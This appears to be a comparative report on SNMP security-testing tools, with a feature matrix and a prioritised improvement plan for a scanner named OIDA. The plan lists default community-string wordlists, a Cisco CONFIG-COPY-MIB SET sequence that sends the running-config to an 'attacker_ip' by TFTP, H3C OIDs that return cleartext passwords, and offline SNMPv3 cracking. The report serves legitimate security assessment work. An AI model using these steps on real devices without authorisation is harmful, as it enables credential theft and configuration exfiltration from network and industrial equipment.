# SNMP Security Testing Tools — Comparative Report

## 1. Dedicated SNMP Tools

### Net-SNMP (snmpwalk / snmpget / snmpbulkwalk / snmpset)

The canonical SNMP toolkit. Ships with every Linux distro and is the reference implementation.

| Attribute | Detail |
|-----------|--------|
| **Language** | C |
| **SNMP versions** | v1, v2c, v3 (full USM: MD5/SHA/SHA-2, DES/AES/AES-256) |
| **Enumeration** | Raw OID walk/get only — no built-in categories |
| **Community brute** | No |
| **Write test** | Yes (snmpset) |
| **SNMPv3 user enum** | No |
| **GETBULK** | Yes (snmpbulkwalk, snmpbulkget) |
| **Output** | Console text, MIB-decoded names. No JSON/CSV/XML. |
| **ICS/OT features** | None — general purpose |
| **Status** | Actively maintained. Latest release 5.9.x (2024). |

**Strengths:** MIB compilation/loading, ASN.1 parsing, full v3 crypto. The gold standard for manual SNMP queries.
**Weaknesses:** No scanning, no brute-force, no structured output. Single-host only.

**Ref:** [net-snmp.org](https://www.net-snmp.org/), [SNMPv3 tutorial](http://www.net-snmp.org/tutorial/tutorial-5/commands/snmpv3.html)

---

### snmp-check (Perl)

Kali-bundled SNMP enumerator by Matteo Cantoni. Single-host, deep enumeration.

| Attribute | Detail |
|-----------|--------|
| **Language** | Perl (Net::SNMP) |
| **SNMP versions** | v1, v2c |
| **Enumeration** | System info, hostname, interfaces, routing, TCP/UDP, processes, software, storage, shares, user accounts, MOTD, mountpoints, IIS stats |
| **Community brute** | Default string check only (public/private) |
| **Write test** | Yes (detects RW community) |
| **SNMPv3 user enum** | No |
| **GETBULK** | No (GETNEXT only) |
| **Output** | Console (human-readable text) |
| **ICS/OT features** | None |
| **Status** | Unmaintained. Last real update ~2013. |

**Strengths:** Broadest built-in enumeration categories of any single tool. Very readable output.
**Weaknesses:** No v3 support, no JSON output, no multi-host, slow (sequential GETNEXT), unmaintained.

**Ref:** [Kali Tools — snmpcheck](https://www.kali.org/tools/snmpcheck/), [man snmpcheck](https://linux.die.net/man/1/snmpcheck)

---

### onesixtyone

Asynchronous SNMP community string brute-forcer. Sends all requests in parallel, listens for responses.

| Attribute | Detail |
|-----------|--------|
| **Language** | C |
| **SNMP versions** | v1, v2c |
| **Enumeration** | sysDescr only (identifies responding community) |
| **Community brute** | Yes — primary purpose. Class B in <13 min. |
| **Write test** | No |
| **SNMPv3 user enum** | No |
| **GETBULK** | No |
| **Output** | Console (IP + community + sysDescr) |
| **ICS/OT features** | None |
| **Status** | Maintained by Trail of Bits. Sporadic updates. |

**Strengths:** Extremely fast mass community brute-force. Minimal resource usage.
**Weaknesses:** Discovery only — no enumeration beyond sysDescr. No v3.

**Ref:** [GitHub — trailofbits/onesixtyone](https://github.com/trailofbits/onesixtyone), [Kali Tools](https://www.kali.org/tools/onesixtyone/)

---

### Braa

Mass SNMP scanner with its own minimal SNMP stack. Queries thousands of hosts simultaneously.

| Attribute | Detail |
|-----------|--------|
| **Language** | C |
| **SNMP versions** | v1, v2c |
| **Enumeration** | Arbitrary OIDs (numeric only, no MIB names) |
| **Community brute** | No (single community per invocation) |
| **Write test** | Yes (SET support) |
| **SNMPv3 user enum** | No |
| **GETBULK** | No (custom stack, GET/GETNEXT/SET only) |
| **Output** | Console (raw OID=value) |
| **ICS/OT features** | None |
| **Status** | Unmaintained. Last commit ~2018. |

**Strengths:** Ultra-fast mass scanning. No library dependencies (own SNMP stack).
**Weaknesses:** No ASN.1 parser (numeric OIDs only), no v3, no structured output.

**Ref:** [GitHub — mteg/braa](https://github.com/mteg/braa), [Kali Tools — braa](https://www.kali.org/tools/braa/)

---

### SNMP-Brute (SECFORCE)

Python-based community brute-forcer with Cisco-specific post-exploitation.

| Attribute | Detail |
|-----------|--------|
| **Language** | Python |
| **SNMP versions** | v1, v2c (v3 limited) |
| **Enumeration** | Cisco IOS info, Linux/Windows system info (configurable) |
| **Community brute** | Yes — async listener pattern, extensive default wordlist |
| **Write test** | Implicit (RW detection for config download) |
| **SNMPv3 user enum** | No |
| **GETBULK** | No |
| **Output** | Console |
| **ICS/OT features** | Cisco config download + type 7 password cracking (John) |
| **Status** | Unmaintained. ~333 stars. Last commit ~2015. |

**Strengths:** Combined brute + enumerate + Cisco exploit chain in one script.
**Weaknesses:** Python 2 era, unmaintained, Cisco-specific focus.

**Ref:** [GitHub — SECFORCE/SNMP-Brute](https://github.com/SECFORCE/SNMP-Brute)

---

### SNMPwn

Ruby-based SNMPv3 user enumeration and password attack tool.

| Attribute | Detail |
|-----------|--------|
| **Language** | Ruby |
| **SNMP versions** | v3 only |
| **Enumeration** | None (attack tool, not enumerator) |
| **Community brute** | N/A (v3 — no communities) |
| **Write test** | No |
| **SNMPv3 user enum** | Yes — exploits "Unknown user name" differential response |
| **GETBULK** | No |
| **Output** | Console |
| **ICS/OT features** | None |
| **Status** | Unmaintained. Last commit ~2017. |

**Strengths:** Only dedicated v3 user enumeration tool (username oracle).
**Weaknesses:** Ruby dependency, unmaintained, no enumeration.

**Ref:** [GitHub — hatlord/snmpwn](https://github.com/hatlord/snmpwn)

---

### snmpv3brute (Applied Risk)

Offline SNMPv3 password brute-forcer from packet captures.

| Attribute | Detail |
|-----------|--------|
| **Language** | Python |
| **SNMP versions** | v3 (offline hash cracking) |
| **Enumeration** | None |
| **Community brute** | N/A |
| **Write test** | No |
| **SNMPv3 user enum** | No (requires known user from pcap) |
| **GETBULK** | N/A |
| **Output** | Console |
| **ICS/OT features** | None |
| **Status** | Unmaintained. ~50 stars. |

**Strengths:** Offline brute-force from pcap (no network access needed). Pure Python, no library deps.
**Weaknesses:** Niche — requires captured SNMPv3 auth packet.

**Ref:** [GitHub — applied-risk/snmpv3brute](https://github.com/applied-risk/snmpv3brute), [Applied Risk blog](https://applied-risk.com/resources/brute-forcing-snmpv3-authentication)

---

### cisco-SNMP-enumeration (NCC Group)

Bash wrapper automating Cisco SNMP attack chain.

| Attribute | Detail |
|-----------|--------|
| **Language** | Bash (wraps net-snmp) |
| **SNMP versions** | v1, v2c |
| **Enumeration** | Cisco IOS version, hostname, ARP, routes, interfaces |
| **Community brute** | Yes (configurable wordlist) |
| **Write test** | Yes (RW community = auto config download) |
| **SNMPv3 user enum** | No |
| **GETBULK** | Via snmpbulkwalk |
| **Output** | Console text + downloaded config files |
| **ICS/OT features** | Cisco type 7 password auto-decode |
| **Status** | Unmaintained. |

**Ref:** [GitHub — nccgroup/cisco-SNMP-enumeration](https://github.com/nccgroup/cisco-SNMP-enumeration)

---

## 2. Pentest Framework Modules

### Metasploit — auxiliary/scanner/snmp/*

| Module | Purpose |
|--------|---------|
| `snmp_login` | Community string brute-force (v1/v2c). Extensive credential DB integration. |
| `snmp_enum` | Deep enumeration: system, interfaces, routes, processes, software, storage, users, shares, IIS. |
| `snmp_enumshares` | Windows share enumeration via SNMP. |
| `snmp_enumusers` | Windows user account enumeration via SNMP. |
| `snmp_set` | Write-access testing (SET operations). |

| Attribute | Detail |
|-----------|--------|
| **SNMP versions** | v1, v2c (v3 support is limited/experimental) |
| **Enumeration** | System, interfaces, routes, processes, software, storage, users, shares |
| **Community brute** | Yes (snmp_login — DB-backed, STOP_ON_SUCCESS, rate control) |
| **Write test** | Yes (snmp_set module) |
| **SNMPv3 user enum** | No |
| **GETBULK** | Yes |
| **Output** | Console + Metasploit DB (searchable, exportable) |
| **ICS/OT features** | None specific to SNMP, but other MSF modules cover ICS |
| **Status** | Actively maintained. |

**Ref:** [OffSec — Scanner SNMP Modules](https://www.offsec.com/metasploit-unleashed/scanner-snmp-auxiliary-modules/), [Rapid7 — snmp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_enum/), [Rapid7 — snmp_login](https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_login/)

---

### Nmap NSE Scripts — snmp-*

| Script | Purpose |
|--------|---------|
| `snmp-brute` | Community string brute-force (pcap-based async) |
| `snmp-info` | Basic SNMPv3 device info extraction |
| `snmp-interfaces` | Network interface enumeration (can feed targets back to Nmap) |
| `snmp-processes` | Running process enumeration |
| `snmp-sysdescr` | System description string |
| `snmp-netstat` | TCP/UDP connection table |
| `snmp-win32-services` | Windows service enumeration |
| `snmp-win32-shares` | Windows share enumeration |
| `snmp-win32-software` | Installed software enumeration |
| `snmp-win32-users` | Windows user enumeration |
| `snmp-ios-config` | Cisco IOS config download (requires RW community) |

| Attribute | Detail |
|-----------|--------|
| **SNMP versions** | v1, v2c (snmp-info supports v3 GET) |
| **Enumeration** | System, interfaces, processes, routes, Windows users/shares/software/services |
| **Community brute** | Yes (snmp-brute — pcap-based parallel) |
| **Write test** | Implicit (snmp-ios-config requires RW) |
| **SNMPv3 user enum** | No |
| **GETBULK** | Depends on script (most use GETNEXT) |
| **Output** | Nmap XML/greppable/normal output |
| **ICS/OT features** | Cisco config extraction. No ICS-specific OIDs. |
| **Status** | Actively maintained (part of Nmap). |

**Ref:** [snmp-brute](https://nmap.org/nsedoc/scripts/snmp-brute.html), [snmp-info](https://nmap.org/nsedoc/scripts/snmp-info.html), [snmp-interfaces](https://nmap.org/nsedoc/scripts/snmp-interfaces.html), [snmp-processes](https://nmap.org/nsedoc/scripts/snmp-processes.html)

---

### Nuclei Templates

| Attribute | Detail |
|-----------|--------|
| **SNMP versions** | v1, v2c |
| **Coverage** | Default community string detection ("public" misconfig), basic sysDescr |
| **Community brute** | Minimal (default strings only) |
| **Write test** | No |
| **SNMPv3 user enum** | No |
| **GETBULK** | No |
| **Output** | Nuclei JSON/SARIF/markdown |
| **ICS/OT features** | None |
| **Status** | Active. Template repo gets monthly releases (v10.3.x, Nov 2025). |

**Ref:** [Nuclei templates repo](https://github.com/projectdiscovery/nuclei-templates), [SNMPv1 public misconfig PR](https://github.com/projectdiscovery/nuclei-templates/pull/12938)

---

## 3. ICS/OT-Specific Tools

### Redpoint (Digital Bond)

Nmap NSE scripts for ICS protocol discovery (459 stars, 149 forks). **No SNMP-specific scripts** — focuses on native ICS protocols (BACnet, DNP3, EtherNet/IP, Modbus, S7, Fox, CODESYS, etc.). Inactive/unmaintained but functions as historical reference.

**Ref:** [GitHub — digitalbond/Redpoint](https://github.com/digitalbond/Redpoint)

### GRASSMARLIN (NSA)

Passive network mapper for ICS environments (1,000 stars). Uses SNMP data passively if captured in pcaps — 54 built-in fingerprints for industrial protocols. Does NOT actively scan SNMP. **Archived April 2023**, no longer maintained. Java-based with GUI network topology visualization.

**Ref:** [GitHub — nsacyber/GRASSMARLIN](https://github.com/nsacyber/GRASSMARLIN)

### PLCScan

Python tool for PLC discovery. **No SNMP capabilities** — focuses exclusively on Modbus TCP (port 502) and Siemens S7 (port 102). Older project exported from Google Code.

### GRFICSv2 / SCADAShutdownTool

Virtual SCADA hacking simulation environment (5 VirtualBox VMs). **No direct SNMP usage** — primarily uses Modbus TCP. This is a testbed, not a scanning tool.

### Known ICS Vendor SNMP Findings

Relevant security observations from research:

- **Allen-Bradley/Rockwell**: MicroLogix devices use community strings `public` (RO) and `private` (RW) — plus an **undocumented** `wheel` (RW) community string, which is a significant security concern
- **Siemens**: SCALANCE switches and some PLCs expose SNMP with model/firmware OIDs; typically enumerated via generic snmpwalk + s7-info.nse combination
- **Schneider Electric**: ConneXium switches and Modicon PLCs support SNMP; ClearSCADA integrates SNMP monitoring
- **General pattern**: Industrial devices commonly ship with `public` community string enabled, no SNMPv3, and vendor-specific MIBs that reveal detailed hardware/firmware information

### General Observation

**No ICS/OT tool specializes in SNMP enumeration with industrial OID databases.** ICS tools focus on native protocols (Modbus, S7, EtherNet/IP, BACnet). SNMP scanning in OT environments is typically done with the same general-purpose tools (snmpwalk, snmp-check, Metasploit) and manual OID lookups for vendor MIBs.

This represents a significant gap in the tooling landscape — industrial devices frequently run SNMP agents with vendor-specific OIDs that reveal firmware versions, module inventory, and configuration details, but no tool automates the mapping of industrial vendor MIBs.

---

## 4. Feature Comparison Matrix

| Tool | v1 | v2c | v3 | Enum Categories | Brute | Write Test | v3 User Enum | GETBULK | JSON/CSV Output | ICS OIDs | Maintained |
|------|:--:|:---:|:--:|:---------------:|:-----:|:----------:|:------------:|:-------:|:---------------:|:--------:|:----------:|
| **Net-SNMP** | Y | Y | Y | Raw OID only | - | Y | - | Y | - | - | Y |
| **snmp-check** | Y | Y | - | 12+ categories | ~ | Y | - | - | - | - | - |
| **onesixtyone** | Y | Y | - | sysDescr only | Y | - | - | - | - | - | ~ |
| **Braa** | Y | Y | - | Raw OID only | - | Y | - | - | - | - | - |
| **SNMP-Brute** | Y | Y | ~ | Cisco/Linux/Win | Y | ~ | - | - | - | ~ | - |
| **SNMPwn** | - | - | Y | None (attack) | N/A | - | Y | - | - | - | - |
| **snmpv3brute** | - | - | Y | None (offline) | N/A | - | - | N/A | - | - | - |
| **NCC cisco-enum** | Y | Y | - | Cisco-specific | Y | Y | - | Y | - | ~ | - |
| **MSF snmp_enum** | Y | Y | ~ | 10+ categories | Y | Y | - | Y | DB | - | Y |
| **Nmap NSE** | Y | Y | ~ | 8+ scripts | Y | ~ | - | ~ | XML | - | Y |
| **Nuclei** | Y | Y | - | Minimal | ~ | - | - | - | JSON | - | Y |
| **OIDA SNMPScanner** | Y | Y | Y | 11 categories | Y | Y | Y | Y | JSON/CSV/XML | Y | Y |

Legend: **Y** = Yes, **-** = No, **~** = Partial/limited

---

## 5. Key Takeaways

### Where OIDA's SNMPScanner stands out

1. **Full SNMPv3 support with user enumeration** — Only SNMPwn (unmaintained Ruby) and OIDA do v3 user enumeration. OIDA also does v3 auth/priv brute-force.

2. **Combined workflow** — Most tools are single-purpose (brute OR enumerate OR write-test). OIDA chains: community brute → enumeration → write test → ARP/MAC extraction → credential hunting in one run.

3. **11 enumeration categories** — Matches or exceeds snmp-check and Metasploit: interfaces, TCP, UDP, routes, processes, software, storage, users, shares, traps, credentials.

4. **Structured output** — JSON, CSV, XML export. Most standalone tools only produce console text.

5. **GETBULK support** — Optional `--bulk` flag for faster walks (v2c/v3). Most standalone tools lack this.

6. **ICS/OT context** — Vendor OID database, ICS-aware port analysis (ICS_PORTS constant), security findings with severity ratings. No other SNMP tool has this.

7. **MIB loading** — Native .mib file loading via `--mib-dirs`. Only net-snmp tools match this.

### Gaps relative to other tools

1. **Mass scanning speed** — Braa and onesixtyone are purpose-built for scanning thousands of hosts in seconds using custom SNMP stacks. OIDA uses pysnmp's standard async API which is slower per-host but more feature-complete.

2. **Cisco config exploitation** — SNMP-Brute and NCC's tool auto-download Cisco configs and crack type 7 passwords. OIDA tests write access but doesn't chain into config download/crack.

3. **Offline v3 cracking** — snmpv3brute can brute-force v3 auth from pcaps. OIDA only does online brute-force.

### Industry gap: ICS vendor MIB enumeration

No existing tool (including OIDA) ships a curated database of industrial vendor SNMP MIBs for automated fingerprinting. This is a significant gap given that most managed switches, PLCs with Ethernet ports, and RTUs expose SNMP with vendor-specific OIDs that reveal:
- Firmware versions and hardware revisions
- Module/slot inventory
- Network configuration (VLANs, spanning tree)
- Diagnostic counters

Potential future enhancement: curated OID-to-vendor mappings for Siemens SCALANCE, Schneider ConneXium, Hirschmann/Belden, Moxa, Phoenix Contact, Cisco IE, Rockwell Stratix, and ABB switches.

---

## 6. Code-Level Comparison: Concrete Improvements for OIDA

Based on source code analysis of all tools, here are prioritized improvements.

### P0 — Critical (Security Impact)

#### 1. Expand community string wordlist (27 → 150+)
OIDA's `SNMP_COMMUNITY_DEFAULTS` has 27 entries. SNMP-Brute ships 198, onesixtyone 51, MSF 119. Missing ICS-critical strings:
```
TENmanUFactOryPOWER, OrigEquipMfr, NoGaH$@!, ILMI, ilmi,
cable-docsis, apc, hp_admin, canon_admin, rmon_admin,
agent_steal, openview, tivoli, pr1v4t3, publ1c,
0392a0, C0de, CR52401, s!a@m#n$p%c,
scalance, ruggedcom, beckhoff, twincat, advantech, eki,
red-lion, kepware, wonderware, indusoft, aveva, ge-fanuc
```
Also missing case variations (`Public`, `PRIVATE`, `CISCO`, `SYSTEM`) and whitespace variants (`" public"`, `"private "`).

**Files:** `src/oida/utils/default_credentials.py` (SNMP_COMMUNITY_DEFAULTS)

#### 2. Cisco config download via SNMP TFTP (CISCO-CONFIG-COPY-MIB)
Both SNMP-Brute and NCC's tool chain SNMP SET operations to trigger config upload:
```
ccCopyProtocol      .1.3.6.1.4.1.9.9.96.1.1.1.1.2   = 1 (TFTP)
ccCopySourceFileType .1.3.6.1.4.1.9.9.96.1.1.1.1.3  = 4 (running-config)
ccCopyDestFileType   .1.3.6.1.4.1.9.9.96.1.1.1.1.4  = 1 (networkFile)
ccCopyServerAddress  .1.3.6.1.4.1.9.9.96.1.1.1.1.16 = attacker_ip
ccCopyFileName       .1.3.6.1.4.1.9.9.96.1.1.1.1.6  = "{host}.cfg"
ccCopyRowStatus      .1.3.6.1.4.1.9.9.96.1.1.1.1.14 = 1 (active → triggers TFTP)
```
Includes Type 7 password decode (known XOR cipher) and Type 5 hash extraction for hashcat/john.
Requires `--exploit-cisco --confirm` flags, RW community, and embedded TFTP server.

**Files:** New `src/oida/protocols/snmp/cisco_exploits.py`, constants.py (add OIDs)

#### 3. H3C/Huawei credential extraction (snmp-hh3c-logins.nse)
Walk H3C-USER-MIB for cleartext credentials — two PEN paths (old 2011, new 25506):
```
hh3cUserName     .1.3.6.1.4.1.25506.2.12.1.1.1.1
hh3cUserPassword .1.3.6.1.4.1.25506.2.12.1.1.1.2
hh3cUserLevel    .1.3.6.1.4.1.25506.2.12.1.1.1.4
```
OIDA has these in `CREDENTIAL_OIDS` but **never walks them** — `_enum_creds()` only checks USM/trap tables.

**Files:** `scanner.py` (_enum_creds method)

### P1 — High (Enumeration Gaps)

#### 4. Missing OIDs from snmp-check and Metasploit

| OID | Name | Source | Impact |
|-----|------|--------|--------|
| `.1.3.6.1.2.1.25.1.2.0` | hrSystemDate (RFC 2579 DateAndTime) | snmp-check | Timezone/clock detection |
| `.1.3.6.1.2.1.4.1.0` | ipForwarding (router detection) | MSF + snmp-check | Identify routers |
| `.1.3.6.1.2.1.4.2.0` | ipDefaultTTL | MSF | OS fingerprinting |
| `.1.3.6.1.2.1.6.10-12.0` | tcpInSegs/OutSegs/RetransSegs | MSF | Network health |
| `.1.3.6.1.4.1.77.1.4.1.0` | domPrimaryDomain | MSF + snmp-check | AD domain name |
| `.1.3.6.1.4.1.77.1.2.3.1.1-2` | svSvcName/InstalledState | MSF + snmp-check | Windows services |
| `.1.3.6.1.2.1.25.3.8.1.2-6` | hrFSTable (mount/type/RW/NFS) | snmp-check | Filesystem enum + NFS finding |
| `.1.3.6.1.4.1.311.1.7.3.1.*` | IIS HTTP statistics (21 OIDs) | MSF + snmp-check | IIS fingerprinting |
| `.1.3.6.1.4.1.11.2.3.9.4.2.1.1.6.5.*` | HP printer job history (8 OIDs) | snmp-check | Credential intel (usernames) |
| `.1.3.6.1.4.1.42.3.12.1.8` | Solaris psProcessUsername | MSF snmp_enumusers | Multi-OS user enum |

**Files:** `constants.py` (new dicts), `scanner.py` (new enum methods)

#### 5. IP address correlation + target feeding (snmp-interfaces.nse)
Nmap extracts IPs from interface table and feeds them back as scan targets. OIDA enumerates interfaces but doesn't walk `ipAddrTable` (.1.3.6.1.2.1.4.20.1.1-3) or correlate IPs to interfaces by ifIndex. Critical for multi-homed ICS devices with OT/IT network separation.

**Files:** `scanner.py` (_enum_interfaces), `proto_args.py` (add `--discover-targets`)

#### 6. Offline SNMPv3 password cracking from PCAP (snmpv3brute)
Extract engineID + auth params from pcap, compute RFC 3414 password-to-key + HMAC offline. ~1000x faster than online brute-force, zero network traffic. Standard ICS assessment workflow.

Implementation: extract with scapy (already a dep), compute HMAC-MD5/SHA1 with localized key, compare first 12 bytes. ~200 LOC.

**Files:** New `src/oida/protocols/snmp/offline_crack.py`, `proto_args.py` (add `--offline-crack PCAP`)

### P2 — Medium (Performance + Polish)

#### 7. PCap-based parallel brute-force (snmp-brute.nse / onesixtyone)
Current OIDA: sequential per-community with 2s timeout each → 200 communities = ~400s.
onesixtyone/nmap: fire-and-forget UDP flood + pcap listener → 200 communities = ~3s.
Use `asyncio.create_datagram_endpoint()` for send, pcap BPF filter for receive.

#### 8. RO vs RW community classification during brute-force
MSF `snmp_login` auto-tests SET after finding valid community. OIDA only flags during explicit `--test-write`. Add access level detection to brute results.

#### 9. SNMPv3 engine discovery without credentials (snmp-info.nse)
Send unauthenticated SNMPv3 GetRequest, parse `msgAuthoritativeEngineID` from response → extract vendor enterprise number, MAC/IP, engine boots/time. No auth failures logged.

#### 10. Expanded SNMPv3 username wordlist (25 → 42)
Add from SNMPwn's 220-entry list: `v3read`, `v3write`, `user1-6`, `cisco`, `hp`, `sonicwall`, `checkpoint`, `procurve`, `mngt`, `cisco1-5`.

#### 11. Auto-detect Windows → enable domain/service/IIS enumeration
snmp-check auto-triggers Windows-specific OID walks when sysDescr contains "Windows". OIDA requires explicit `--enum users,shares`.

#### 12. Separate `--brute-timeout` (0.3s) from `--timeout` (2-5s)
SNMPwn uses 300ms for enumeration probes. OIDA uses the same timeout for everything.

---

## Sources

### Dedicated Tools
- [Net-SNMP](https://www.net-snmp.org/) | [SNMPv3 tutorial](http://www.net-snmp.org/tutorial/tutorial-5/commands/snmpv3.html)
- [Kali Tools — snmpcheck](https://www.kali.org/tools/snmpcheck/)
- [GitHub — trailofbits/onesixtyone](https://github.com/trailofbits/onesixtyone)
- [GitHub — mteg/braa](https://github.com/mteg/braa) | [Kali Tools — braa](https://www.kali.org/tools/braa/)
- [GitHub — SECFORCE/SNMP-Brute](https://github.com/SECFORCE/SNMP-Brute)
- [GitHub — hatlord/snmpwn](https://github.com/hatlord/snmpwn)
- [GitHub — applied-risk/snmpv3brute](https://github.com/applied-risk/snmpv3brute) | [Applied Risk blog](https://applied-risk.com/resources/brute-forcing-snmpv3-authentication)
- [GitHub — nccgroup/cisco-SNMP-enumeration](https://github.com/nccgroup/cisco-SNMP-enumeration)

### Frameworks
- [Rapid7 — snmp_enum](https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_enum/) | [snmp_login](https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_login/)
- [Nmap NSE — snmp-brute](https://nmap.org/nsedoc/scripts/snmp-brute.html) | [snmp-info](https://nmap.org/nsedoc/scripts/snmp-info.html) | [snmp-interfaces](https://nmap.org/nsedoc/scripts/snmp-interfaces.html) | [snmp-processes](https://nmap.org/nsedoc/scripts/snmp-processes.html)
- [Nuclei templates](https://github.com/projectdiscovery/nuclei-templates)

### ICS/OT
- [GitHub — digitalbond/Redpoint](https://github.com/digitalbond/Redpoint)
- [GitHub — nsacyber/GRASSMARLIN](https://github.com/nsacyber/GRASSMARLIN)
- [HackTricks — Pentesting SNMP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) | [SNMP RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce) | [Cisco SNMP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/cisco-snmp)
- [Rapid7 — SNMP Data Harvesting](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/)
- [Hackviser — SNMP Pentesting](https://hackviser.com/tactics/pentesting/services/snmp)
